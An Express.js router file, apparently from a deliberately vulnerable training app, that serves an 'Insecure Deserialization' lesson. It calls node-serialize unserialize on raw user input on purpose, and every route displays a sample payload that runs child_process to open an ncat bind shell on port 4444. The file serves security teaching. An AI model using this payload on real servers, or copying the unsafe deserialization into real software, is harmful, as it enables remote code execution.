module.exports = function() {
	var express = require("express");
	var router = express.Router();
	var handlebars = require("express-handlebars");
	var serialize = require("node-serialize");

	router.get("/", (req,res) => {
		var context = {
			header: "> Insecure Deserialization",
			insecureDeserialization: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			password: req.session.password,
			benign: "{test:123}",
			vuln: `var obj = req.body.userInput<br>var deserialized = serialize.unserialize(obj)`,
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			form: `{"anything_here":"_$$ND_FUNC$$_function (){сonsole.log(1)}"}`
		}
		res.render("insecureDeserialization",context)
		console.log("Insecure Deserialization loaded!")

		// Saves current path for light/dark theme redirect
		req.session.previousPath = req.originalUrl
	})

	router.post("/serialize", (req,res) => {
		var context = {
			header: "> Insecure Deserialization",
			insecureDeserialization: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			password: req.session.password,
			benign: "{test:123}",
			vuln: `var obj = req.body.userInput\
			var deserialized = serialize.unserialize(obj)`,
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			form: `{"anything_here":"_$$ND_FUNC$$_function (){сonsole.log(1)}"}`
		}
		var obj = req.body.userInput;
		var serialized = serialize.serialize(obj);
		console.log(serialized);
		context.serialized = serialized;
		res.render("insecureDeserialization",context)
		console.log("Insecure Deserialization loaded!")

		// Saves current path for light/dark theme redirect
		req.session.previousPath = req.originalUrl
	})

	router.post("/deserialize", (req,res) => {
		var context = {
			header: "> Insecure Deserialization",
			insecureDeserialization: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			password: req.session.password,
			benign: "{test:123}",
			vuln: `var obj = req.body.userInput\
			var deserialized = serialize.unserialize(obj)`,
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			form: `{"anything_here":"_$$ND_FUNC$$_function (){сonsole.log(1)}"}`
		}
		var obj = req.body.userInput;
		var deserialized = serialize.unserialize(obj);
		var concatenated_string = '';
                for(const[key, value] of Object.entries(deserialized)){
                        concatenated_string += value;
                }
		console.log(context.payload);
		console.log(concatenated_string);
		context.deserialized = concatenated_string;
		res.render("insecureDeserialization",context)
		console.log("Insecure Deserialization loaded!")

		// Saves current path for light/dark theme redirect
		req.session.previousPath = req.originalUrl
	})

	router.post("/sanitized", (req,res) => {
		var context = {
			header: "> Insecure Deserialization",
			insecureDeserialization: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			password: req.session.password,
			benign: "{test:123}",
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			form: `{"anything_here":"_$$ND_FUNC$$_function (){сonsole.log(1)}"}`
		}
		var obj = req.body.userInput;
		var sanitized = JSON.stringify(obj);
		console.log(sanitized);
		var deserialized = serialize.unserialize(sanitized);
		var concatenated_string = '';
                for(const[key, value] of Object.entries(deserialized)){
                        concatenated_string += value;
                }
		console.log(concatenated_string);
		context.deserialized = concatenated_string;
		res.render("insecureDeserialization",context)
		console.log("Insecure Deserialization loaded!")

		// Saves current path for light/dark theme redirect
		req.session.previousPath = req.originalUrl
	})

	return router
}();